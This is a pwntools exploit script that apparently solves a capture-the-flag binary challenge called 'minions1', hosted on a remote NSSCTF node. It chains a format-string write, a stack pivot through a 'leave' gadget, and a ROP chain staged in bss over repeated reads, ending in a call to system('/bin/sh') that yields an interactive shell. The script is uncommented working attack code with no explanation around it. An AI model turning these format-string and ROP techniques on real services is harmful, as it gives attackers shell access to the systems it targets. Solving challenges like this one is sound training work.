from pwn import *
import sys
remote_addr = ["node1.anna.nssctf.cn",28654]
#libc = ELF('')
elf = ELF('./minions1')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./minions1")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)


leave = 0x400758
pop_rdi = 0x400893
read_plt = elf.plt['read']
system_plt = elf.plt['system']

debug('''b *0x601da0''')
payload = fmtstr_payload(6, {0x6010a0: 102})
sa(b'name?\n', payload)
payload = b'a' * (0x30) + p64(0x6010c0 - 8) + p64(leave)
sa(b'you\n', payload)
#payload = p64(pop_rdi) + p64(0x6010c0 + 0x18) + p64(0x400763) + b'/bin/sh\x00'
payload = p64(0x400891) + p64(0x6010e8) + p64(0) + p64(read_plt) + p64(0x400581)
sa(b'Minions?\n', payload)
bss = 0x6010c0 + 0x28 + 0x28
for i in range(81):
    pause()
    payload = p64(0x400891) + p64(bss) + p64(0) + p64(read_plt) + p64(0x400581)
    s(payload)
    bss += 0x28

pause()
payload = p64(0x400891) + p64(pop_rdi) + p64(0x601da8) + p64(0x400763) + b'/bin/sh\x00'
s(payload)

shell()
